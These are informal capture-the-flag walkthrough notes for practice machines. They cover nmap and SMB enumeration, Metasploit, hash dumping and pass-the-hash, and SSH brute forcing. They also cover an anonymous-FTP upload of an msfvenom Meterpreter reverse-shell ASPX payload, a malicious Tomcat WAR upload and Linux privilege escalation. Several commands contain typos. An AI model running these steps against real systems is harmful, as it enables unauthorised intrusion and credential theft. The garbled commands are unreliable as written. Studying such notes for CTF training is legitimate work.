Walkthrough notes 

    Start with a simple nmap scan namp –A –T4 –p- IP 

        Should scan UDP as well, as –sU to the beginning  

        -A is useful because it runs scripts and gets software and version numbers  

        Message signing disabled  

            Dangerous, could give access to a shell  

    Run smbclient -L \\\\IP\\ 

        Smb can be very vulnerable  

        NT_STATUS_INVALID_PARTAMETER 

            Means you're not getting in and that's ok 

        Enum4linux might work  

        Metasploit to run smb_version to get the smb_version  

            Got a windows version but not always an smb version 

    Take what information you have found and search [service info] exploit 

        Look for exploitdb.com or rapid7 

        If you find a good exploit find it on metasploit and see what you can do  

            Make sure to set a target unless automatic targeting is working  

    Windows: getui to find the user  

        Make sure that the Meterpreter matches the Architecture, makes things easier 

    Linux 

        Locate root.txt or change to the root foldre 

            Updatedb to update the locate db 

        Locate user.txt 

        Those file outputs are your flags  

    Hashdump 

        Dumps that hashes to get user password hashes  

        Good to try to pass the hash around to see if it helps  

        Type user.txt is the flag to be submitted in the CTF 

    If you're ok with being detected than brute forcing a ssh port could be good 

        Did they find you doing 1000 bad passwords? Why not, good for the report  

    Devel 

        Shell code generation  

        Enumeration  

        Still starting with the nmap scan  

        Website 

            First go to the website  

            Poop hygine to have default webpages, makes you think lazy engineer and maybe will have other issues 

                Might have a hidden directory because of the default page  

            Time to do a dirbuster test to find them  

                Gobuster or dirb is the other one 

                Wordlist at usr/share/wordlist/dirbuster/ 

                Windows machine so PHP and IIS7 isn't right, use asm, asmx, asp, aspx, txt, zip, backup, ... 

        Ftp 

            Fpt server might let us replace the IIs7 picture with something else  

                Ftp IP 

                Anonymous, password blank anonymous  

                Put dog.jpg  

                Ls to see that it's transferred  

                The server executed on a picture file so you could put some malware on the machine and have the server execute it 

            Msfvenom 

                Look for online cheat sheets for payload generation 

                Msfvenom –p windows/meterperter/reverse_tcp LHOST=IP LPORT=4444 –f apsx > ex,aspx 

                    Put into a file so that it will be run instead of just printing it to console  

                Use metasploit's exploit handler to make a listener  

                    Set payload  ^ 

                    Set LGOST and run  

                    Move the aspx file  

                        Good to transfer a file via binary over ascii 

                    Go to the IP/filename  

                        Executes and gets the shell  

                Use the psot/multi/recon to get some post enumeration to find something else to get in   

    Tomcat  

        Good way is to get to the default page and try default creds  

        Upload a malicious WAR file to get a backdoor shell access  

    Typically port 80 is the way in if only 22 (ssh) and 80 are returned from nmap  

    When not root user find the os version to start getting privileged esclation  

        History is a good command to run 

        Cat .bash_history 

        Sudo –l  

            See what commands can be run without passwords  

    Transfer files to a machine with shell access  

        Start a python server –> python –m SimpleHTTPServer 80 

        Go to target system then wget http://IP/filename 

 

 

Get wapalizer 

 

    Good scripts to get some privileged escalation  

        LinEnum.sh 

        Linuxprivchecker.py 

        Linux Privilege Esclation Scrips blow on netsec.ws has more resources  

            Check out the g0tmilk blog 

    For windows use fuzzysecurity 

Flags: 

    Linux 

        Normally on /home/user/user.txt 

        /root/root.txt 

    Windows  

        C:\Users\Username\Desktop\user.txt 

        C:\Users\Administrator\Desktopoot.txt 

        Type output the content  